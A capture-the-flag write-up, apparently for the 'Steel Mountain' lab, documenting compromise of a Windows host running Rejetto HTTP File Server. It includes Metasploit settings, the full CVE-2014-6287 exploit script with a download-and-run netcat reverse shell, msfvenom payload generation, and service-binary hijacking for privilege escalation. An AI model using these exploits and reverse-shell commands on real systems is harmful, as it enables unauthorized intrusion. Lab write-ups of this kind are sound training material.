# Steel Mountain

## Enumerate

- nmap (doesn't respond to ICMP pings)

~~~
nmap -sC -sV -sS -oN initial.txt <ip>
~~~

port 80 contains webserver with picture of bill from mrrobot

gobuster websurver

~~~
gobuster dir -u <ip> -w /usr/share/wordlists/dirb/common.txt 
~~~

gobuster shows only image and index 

nikto 

~~~
nikto -h <ip>
~~~

Shows Server: Microsoft-IIS/8.5 nothing else.

nmap again all ports

~~~
nmap -sC -sV -sS -p- -oN initial.txt <ip>
~~~

Shows new port 8080/tcp open  http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) & 808.

I was dumb and didn't google the fucking file server thinking nmap would tell me!!

file server is Rejetto HTTP File Server


## Metasploit the fucker!!!

Use windows/http/rejetto_hfs_exec to gain access.

~~~
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    RHOST IP          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     my IP            yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

~~~

Takes a while to upload the payload and get meterpreter shell.


Userflag in C:\Users\bill\Desktop


## Privesc


Upload PowerUp.ps1 to search for privesc.

~~~

upload /root/tools/win_priv/PowerUp.ps1

load powershell
powershell_shell

. .\PowerUp.ps1

Invoke-AllChecks

~~~

Output of interest.

~~~

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True

~~~

The ASCService.exe can be stopped and restarted with a reverse shell!!

~~~
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.237.130 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ven.exe 
~~~

First we need to  stop the service.

Then we need to overwrite the ASCService.exe with own file.

Then we can start the service again. 

~~~
Stop-Service AdvancedSystemCareService9
Copy-Item -Path 'C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ven.exe' -Destination 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'
Start-Service AdvancedSystemCareService9
~~~

use metasploits multihander module as a listening device but run -j to run in background.

## Without metasploit

Copy netcat binary to directory, then launch a netcat server and a http.server

~~~
cp /usr/share/windows-binaries/nc.exe .

python -m http.server 80

nc -lvnp 1337
~~~

Searchsploit suggests the following python2 script (change ip_addr to tun0 address and local port can be changed)

~~~
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#         It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#         It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
   def script_create():
      urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

   def execute_script():
      urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

   def nc_run():
      urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")


   ip_addr = "" #local IP address
   local_port = "1337" # Local Port number
   vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
   save= "save|" + vbs
   vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
   exe= "exec|"+vbs2
   vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
   exe1= "exec|"+vbs3
   script_create()
   execute_script()
   nc_run()
except:
   print """[.]Something went wrong..!
   Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
   Don't forgot to change the Local IP address and Port number on the script"""
   
            

~~~

Run it once to upload the nc to the windows machine. Run again to get nc to call back to our nc

~~~

python2 .py <ip of target> <port (8080 in this case)>
~~~

Once reverse shell is found upload winpeas, run it and save to file.

~~~
powershell -c invoke-webrequest http://10.8.237.130/winPEASx64.exe -outfile winpeas.exe

powershell -c ". .\winpeas.exe | tee-object -filepath winpeas.txt"
~~~

Output shows the same service can be overwritten. Stop service (using commands from above with powershell -c in front). 

Then upload msf rev shell

~~~
powershell -c invoke-webrequest http://10.8.237.130/ven.exe -outfile ven.exe
~~~

THen copy .exe the same way as before then start service (with another nc -lvnp listening).